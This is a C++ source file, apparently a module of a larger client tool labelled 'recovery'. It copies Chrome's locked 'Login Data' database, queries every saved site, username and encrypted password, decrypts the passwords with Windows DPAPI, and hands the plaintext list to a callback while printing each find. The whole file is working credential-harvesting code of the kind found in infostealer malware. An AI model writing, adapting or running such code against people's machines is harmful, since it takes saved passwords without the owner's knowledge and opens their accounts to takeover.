#include "ChromePassReader.h"
#include <fstream>
#include <vector>
#include <iostream>
#include "sqlite3.h"

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <wincrypt.h>
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")
#endif

namespace rslm {
    namespace client {
        namespace recovery {

            // Fonction pour décrypter avec DPAPI (Windows Data Protection)
            std::string DecryptWithDPAPI(const std::string& encryptedData) {
#ifdef _WIN32
                DATA_BLOB inData;
                DATA_BLOB outData;

                inData.pbData = (BYTE*)encryptedData.c_str();
                inData.cbData = encryptedData.size();

                if (CryptUnprotectData(&inData, nullptr, nullptr, nullptr, nullptr, 0, &outData)) {
                    std::string result((char*)outData.pbData, outData.cbData);
                    LocalFree(outData.pbData);
                    return result;
                }
#endif
                return "";
            }

            void ChromePassReader::ReadPasswords(PasswordCallback callback) {
                std::vector<RecoveredPassword> passwords;

                std::string dbPath = GetBrowserPath() + "\\Login Data";

                std::cout << "[Chrome] Looking for database at: " << dbPath << std::endl;

                // Copier le fichier car il est verrouillé par Chrome
                std::string tempPath = GetBrowserPath() + "\\LoginData.tmp";
                if (!CopyFileA(dbPath.c_str(), tempPath.c_str(), FALSE)) {
                    std::cout << "[Chrome] Failed to copy database (error: " << GetLastError() << ")" << std::endl;
                    if (callback) callback(passwords);
                    return;
                }

                sqlite3* db = nullptr;
                if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
                    std::cout << "[Chrome] Failed to open database: " << sqlite3_errmsg(db) << std::endl;
                    DeleteFileA(tempPath.c_str());
                    if (callback) callback(passwords);
                    return;
                }

                const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
                sqlite3_stmt* stmt;

                if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        std::string url = (const char*)sqlite3_column_text(stmt, 0);
                        std::string username = (const char*)sqlite3_column_text(stmt, 1);
                        const void* passwordBlob = sqlite3_column_blob(stmt, 2);
                        int passwordSize = sqlite3_column_bytes(stmt, 2);

                        if (passwordBlob && passwordSize > 0) {
                            std::string encryptedPassword((char*)passwordBlob, passwordSize);
                            std::string password = DecryptWithDPAPI(encryptedPassword);

                            if (!url.empty() && !username.empty()) {
                                passwords.push_back({
                                    url,        // url
                                    username,   // username
                                    password,   // password
                                    "Chrome"    // application
                                    });
                                std::cout << "[Chrome] Found: " << url << " / " << username << std::endl;
                            }
                        }
                    }
                    sqlite3_finalize(stmt);
                }
                else {
                    std::cout << "[Chrome] SQL error: " << sqlite3_errmsg(db) << std::endl;
                }

                sqlite3_close(db);
                DeleteFileA(tempPath.c_str());

                std::cout << "[Chrome] Total passwords found: " << passwords.size() << std::endl;

                if (callback) callback(passwords);
            }

            std::string ChromePassReader::GetBrowserPath() {
#ifdef _WIN32
                char localAppData[MAX_PATH];
                if (SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData) == S_OK) {
                    return std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default";
                }
#endif
                return "";
            }

        } // namespace recovery
    } // namespace client
} // namespace rslm